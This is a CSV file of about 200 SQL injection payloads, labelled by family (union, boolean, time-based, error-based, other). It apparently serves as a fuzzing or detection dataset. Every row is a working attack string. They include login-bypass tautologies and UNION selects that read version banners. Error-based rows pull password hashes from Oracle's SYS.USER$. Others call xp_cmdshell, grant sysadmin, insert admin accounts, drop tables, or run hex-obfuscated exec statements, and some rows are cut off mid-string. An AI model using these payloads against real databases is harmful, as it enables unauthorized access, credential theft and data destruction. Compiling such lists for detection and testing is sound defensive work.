source_line,family,payload
389,union," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'"
390,boolean,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1
391,boolean," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1"
392,time,or sleep  (  __TIME__  )    =  '
393,boolean," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1"
394,union," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1"
395,union," select * from users where id  =  1 union select  @ $,version  (    )   -- 1"
396,union," select * from users where id  =  1 union select +!<@,version  (    )   -- 1"
397,union," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1"
399,other,", exec   (  'sel' + 'ect us' + 'er'  ) "
400,boolean,anything' OR 'x'  =  'x
401,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1"
402,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1"
403,union," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1"
404,other,&'
405,boolean,a' or 3  =  3--
406,union," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'"
407,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1"
408,boolean,"admin""or 1  =  1 or """"  =  """
409,union,uni/**/on sel/**/ect
410,other,""" or """"&"""
411,time," )    )   ,waitfor delay '0:0:__TIME__'--"
412,boolean," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1"
413,time,1 waitfor delay '0:0:10'--
414,other,bfilename
415,boolean,admin'  )   or   (  '1'  =  '1'--
416,other,UEf
418,time,1 or sleep  (  __TIME__  )  #
419,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i"
420,union," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'"
421,union," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'"
422,boolean,"1' and 1  =    (  select count  (  *  )   from tablenames  )  , --"
423,time,or sleep  (  __TIME__  )  #
424,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i"
425,boolean," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1"
426,other,||6
427,boolean,or 1/*
428,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;"
429,boolean,select * from users where id  =  1.%@ or 1  =  1 -- 1
430,boolean," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1"
431,union," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1"
432,boolean," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1"
434,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i"
435,boolean,select * from users where id  =  1 or $<\. or 1  =  1 -- 1
436,union," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1"
437,other,or 'whatever' in   (  'whatever'  ) 
438,other,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) 
439,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1'
440,other,?
441,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i
442,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'"
443,boolean,"admin""  )   or   (  ""1""  =  ""1""#"
444,union," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1"
445,boolean," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1"
446,other, or '' '
447,boolean," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1"
448,boolean,or 1  =  1
449,other," , drop table temp --"
450,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i"
451,time,""" or benchmark  (  10000000,MD5  (  1   )    )   #"
452,boolean,""" or ""x""  =  ""x"
453,boolean,select * from users where id  =  '1'<@.. or 1  =  1 -- 1'
454,union," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1"
455,boolean, or 'something' like 'some%'
456,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --"
457,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i"
458,boolean,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1'
459,other,", exec master..xp_cmdshell 'ping 10.10.1.2'--"
460,boolean,admin' or '1'  =  '1'--
461,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --"
462,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i"
463,union," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1"
464,union," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1"
465,time,""";waitfor delay '0:0:__TIME__'--"
467,boolean,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1'
468,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1"
469,boolean," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1"
470,boolean,’ or ‘1’  =  ’1
471,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'"
472,boolean,admin'or 1  =  1 or ''  =  '
473,union," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'"
474,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ..."
475,other,exec  (  @s  ) 
476,boolean," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1"
477,union," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1"
479,boolean,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1
480,union," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1"
481,boolean,"x' AND email IS NULL, --"
482,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'"
484,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'"
485,union," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1"
486,union," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1"
487,other,update
489,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1"
490,time,"""   )    )    or pg_sleep  (  __TIME__  )  --"
491,other,||'6
492,union," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1"
493,other,or   (  EXISTS  ) 
494,other,^'
495,boolean,or 'text'   =   n'text'
496,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1"
497,union," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'"
498,boolean," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1"
499,union," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1"
500,boolean, or 0  =  0 --
501,boolean," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1"
502,boolean," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1"
503,union," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1"
504,union," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1"
505,other,password:*/  =  1--
506,union," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1"
507,boolean," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1"
508,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'"
509,other," union   (  select NULL,   (  select @@version   )    )    --"
510,boolean," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1"
511,union," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1"
512,union," select * from users where id  =  1 +\. union select null,@@VERSION -- 1"
513,union," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1"
514,union," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1"
515,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1"
516,union," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1"
517,union," select * from users where id  =  1. union select null,version  (    )   -- 1"
518,boolean," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1"
519,union," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1"
520,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i
521,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1
522,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i"
523,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1"
524,boolean," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1"
525,union," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1"
526,boolean," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1"
527,union,UNION SELECT
528,other,asc
529,other," || myappadmin.adduser  (  'admin', 'newpass'  )   || '"
530,other,"exec sp_addsrvrolemember 'name' , 'sysadmin'"
531,union," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1"
532,boolean,  )   or true--
533,union," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1"
534,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i"
535,boolean, or userid like '%
536,other," union   (  select NULL, NULL,   (  select @@version   )    )    --"
537,other,/
538,boolean,select * from users where id  =  1 or $<\ or 1  =  1 -- 1
539,other,"admin""/*"
540,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1"
541,time," )  ,waitfor delay '0:0:__TIME__'--"
542,union," select * from users where id  =  1 union select @<@.,version  (    )   -- 1"
543,boolean," select * from users where id  =  1 or ""._"" or 1  =  1 -- 1"
544,boolean,"admin"" or ""1""  =  ""1"
545,other, union   (  select @@version  )   --
546,other, or ''^'
547,time,"""   )    )    or sleep  (  __TIME__  )    =  """
548,other," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --"
549,union," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1"
550,union," select * from users where id  =  1 union select @ _,version  (    )   -- 1"
551,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1
552,boolean,select * from users where id  =  '1' <@$_ or 1  =  1 -- 1'
553,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1"
554,boolean," select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1"
555,boolean,"""hi""""  )   or   (  """"a""""  =  """"a"""
556,other,select name from syscolumns where id   =     (  sele ...
557,boolean," select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1"
558,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --"
559,union," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'"
561,union,union all select @@version--
562,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i"
563,other,t'exec master..xp_cmdshell 'nslookup www.google.com'--
564,boolean,""" or isNULL  (  1/0  )   /*"
565,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'"
566,boolean," select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1"
567,boolean," select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1"
568,other,declare @q nvarchar   (  200  )   0x730065006c00650063 ...
571,union," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1"
572,boolean,"admin"" or 1  =  1/*"
574,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1"
575,other,declare @s varchar   (  8000  )   select @s   =   0x73656c ...
576,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'"
577,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1"
578,boolean," select * from users where id  =  1 or "".;"" or 1  =  1 -- 1"
579,union," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1"
580,other,", begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >"
581,other," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --"
582,boolean,hi' or 1  =  1 --
584,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1
585,union," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1"
586,boolean," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1"
587,boolean," select * from users where id  =  1 or ""1["" or 1  =  1 -- 1"
588,other,desc
589,boolean," select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1"
591,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1"
592,boolean,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1
593,other,0x770061006900740066006F0072002000640065006C00 ...
594,union," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1"
595,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'"
596,boolean," select * from users where id  =  1 or ""]."" or 1  =  1 -- 1"
597,boolean," select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1"
598,boolean,or isNULL  (  1/0  )   /*
599,other,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  "
600,boolean," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1"
601,boolean," select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1"
602,boolean,"admin"" or ""1""  =  ""1""#"
603,boolean,"admin"" or 1  =  1--"
604,boolean, or user like '%
605,boolean,admin'  )   or '1'  =  '1
606,time,""" or sleep  (  __TIME__  )  #"
607,boolean," select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1"
